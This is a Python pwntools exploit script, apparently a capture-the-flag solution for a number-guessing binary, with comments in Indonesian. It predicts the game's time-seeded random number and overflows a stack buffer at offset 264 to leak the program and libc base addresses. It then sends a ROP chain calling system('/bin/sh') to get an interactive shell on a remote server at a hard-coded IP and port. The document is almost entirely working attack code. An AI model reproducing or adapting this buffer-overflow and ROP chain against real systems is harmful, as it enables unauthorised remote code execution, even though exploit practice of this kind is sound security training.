#!/usr/bin/python3
from pwn import *
from ctypes import CDLL

# =========================================================
#                          SETUP                         
# =========================================================
exe = './tebakangka_patched' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6' # <-- change this
libc2 = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF(libc, checksec=False)
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '206.189.32.77', 9502 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
# continue
breakrva 0x14db
breakrva 0x148f
'''.format(**locals())


# =========================================================
#                         NOTES
# =========================================================

def funny_random(eax):
    edx = eax
    
    eax = edx
    eax <<= 3
    eax &= 0xFFFFFFFFFFFFFFFF
    
    eax += edx
    eax &= 0xFFFFFFFFFFFFFFFF
    
    if eax & 0x80000000:
        rdx = (eax | ~0xFFFFFFFF)
    else:
        rdx = eax & 0xFFFFFFFF
    rdx &= 0xFFFFFFFFFFFFFFFF
    
    rdx *= -0x6c503075
    rdx &= 0xFFFFFFFFFFFFFFFF
    
    rdx >>= 32
    
    edx = rdx & 0xFFFFFFFF
    edx += eax
    edx &= 0xFFFFFFFF
    
    if edx & 0x80000000:
        edx = (edx >> 11) | 0xFFF80000
    else:
        edx >>= 11
    
    ecx = eax
    if ecx & 0x80000000:
        ecx = 0xFFFFFFFF
    else:
        ecx = 0x0
    
    edx -= ecx
    
    ecx = edx
    ecx *= 0xdde
    ecx &= 0xFFFFFFFF
    
    eax -= ecx
    eax = (eax + 2**32) % 2**32
    
    edx = eax
    eax = edx
    
    return eax



# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)
    
    io.sendlineafter(b': ', b'1')
    
    # kudu nge brute dikit sampe bener, kadang langsung bisa kadang engga
    libc2.srand(libc2.time(0))
    random = libc2.rand()
    random = funny_random(random)
    info(f'Random: {hex(random)}')
    
    io.sendlineafter(b': ', str(random).encode())
    
    # jump sambil nge leak
    offset = 264
    payload = cyclic(offset)
    payload += b'\xb4'
    
    io.sendafter(b'?', payload)
    # io.recvlines(1)
    leak = io.recvuntil(b'...', drop=True)
    
    # only get last 6 bytes
    leak = unpack(leak[-6:].ljust(8, b'\x00'))
    info(f'Leak: {hex(leak)}')
    elf.address = leak - 0x15b4
    info(f'Base: {hex(elf.address)}')
    
    # rdi ada funlockfile, langsung leak ajah trus balik ke vuln
    vuln = elf.address + 0x1458
    payload = cyclic(offset)
    payload += p64(elf.plt['puts'])
    payload += p64(vuln)
    io.sendafter(b'?', payload)
    
    io.recvuntil(b'makanmu\n')
    libc.address = u64(io.recvline().strip().ljust(8, b'\x00')) - libc.sym['funlockfile']
    info(f'Libc: {hex(libc.address)}')
    
    # profit
    rop = ROP(libc)
    rop.call(rop.ret.address)
    rop.system(next(libc.search(b'/bin/sh\x00')))
    
    payload = cyclic(offset)
    payload += rop.chain()
    io.sendafter(b'?', payload)
    
    io.interactive()
    
if __name__ == '__main__':
    exploit()
